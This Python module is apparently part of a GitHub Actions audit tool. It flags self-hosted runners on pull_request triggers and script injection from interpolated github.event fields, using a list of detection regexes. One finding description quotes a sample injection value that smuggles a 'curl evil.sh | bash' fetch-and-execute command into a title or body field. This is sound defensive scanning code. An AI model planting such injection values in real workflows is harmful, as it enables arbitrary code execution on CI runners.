"""Runner / execution-environment security checks (GHA-030 to GHA-032)."""

from __future__ import annotations

import re
from collections.abc import Iterable

from gha_audit.findings import Finding, WorkflowDoc, check_meta

CATEGORY = "runner_security"

# Dangerous github-event interpolation patterns when used in `run:` —
# user-controllable values that can break out of the shell.
DANGEROUS_INTERPOLATIONS = [
    re.compile(r"\$\{\{\s*github\.event\.issue\.title\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.issue\.body\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.pull_request\.title\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.pull_request\.body\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.pull_request\.head\.ref\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.comment\.body\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.review\.body\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.head_commit\.message\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.head_ref\s*\}\}"),
]


@check_meta(id="GHA-030", severity="medium", title="Self-hosted runner on PR-from-fork trigger")
def check_self_hosted_on_pr(doc: WorkflowDoc) -> Iterable[Finding]:
    """If runs-on includes a self-hosted label AND the workflow triggers on
    pull_request, attackers can run arbitrary code on your runner from a
    malicious fork PR."""
    on = doc.on
    has_pr_trigger = False
    if isinstance(on, str) and on == "pull_request":
        has_pr_trigger = True
    elif isinstance(on, list) and "pull_request" in on:
        has_pr_trigger = True
    elif isinstance(on, dict) and "pull_request" in on:
        has_pr_trigger = True
    if not has_pr_trigger:
        return

    for jname, job in doc.iter_jobs():
        runs_on = job.get("runs-on")
        runs_on_str = ""
        if isinstance(runs_on, str):
            runs_on_str = runs_on
        elif isinstance(runs_on, list):
            runs_on_str = " ".join(str(x) for x in runs_on)
        if "self-hosted" not in runs_on_str.lower():
            continue
        yield Finding(
            id="GHA-030",
            category=CATEGORY,
            severity="medium",
            job=jname,
            title=f"Self-hosted runner used on `pull_request` (job '{jname}')",
            description=(
                f"Job '{jname}' runs on a self-hosted runner (`runs-on: {runs_on}`) "
                "and the workflow triggers on `pull_request`. Forks can open PRs "
                "that execute code on your self-hosted runner. The runner machine "
                "lives in your network — a compromised runner can pivot internally."
            ),
            remediation=(
                "Either (a) restrict self-hosted runners to private repos / "
                "trusted contributors only via `if: github.event.pull_request.head.repo.full_name == github.repository`, "
                "or (b) switch the job to a `ubuntu-latest` GitHub-hosted runner "
                "for PR triggers."
            ),
            references=["GHA-Self-Hosted-Runner-Security"],
        )


@check_meta(id="GHA-032", severity="high", title="Script injection via untrusted github-event interpolation")
def check_script_injection(doc: WorkflowDoc) -> Iterable[Finding]:
    """The signature check — interpolating user-controllable github.event fields
    directly into a `run:` shell script is the classic injection vector."""
    for jname, idx, step in doc.iter_steps():
        run = step.get("run")
        if not isinstance(run, str):
            continue
        for pattern in DANGEROUS_INTERPOLATIONS:
            m = pattern.search(run)
            if m:
                matched_token = m.group(0)
                step_name = step.get("name") or f"step #{idx + 1}"
                yield Finding(
                    id="GHA-032",
                    category=CATEGORY,
                    severity="high",
                    job=jname,
                    step=step_name,
                    title=f"Script injection: `{matched_token}` in `run:` script",
                    description=(
                        f"Job '{jname}', step '{step_name}': the `run:` block "
                        f"interpolates `{matched_token}` directly into a shell "
                        "script. That value is user-controllable — an attacker "
                        "can set it to `\"; curl evil.sh | bash; \"` and execute "
                        "arbitrary code in your runner with your workflow's "
                        "permissions. This is the technique behind several "
                        "2024–2025 supply-chain incidents."
                    ),
                    remediation=(
                        "Pass the value via `env:` (env vars are NOT interpreted "
                        "as shell syntax by ${{ }} expansion) and use it as `$VAR` "
                        "in the script:"
                    ),
                    fix_yaml_snippet=(
                        "      env:\n"
                        f"        PR_TITLE: {matched_token}\n"
                        "      run: |\n"
                        "        echo \"$PR_TITLE\"  # safe — shell quoting protects us"
                    ),
                    references=["GHA-Script-Injection", "CodeQL-js/code-injection"],
                )
                break  # one finding per step is enough


CHECKS = [
    check_self_hosted_on_pr,
    check_script_injection,
]
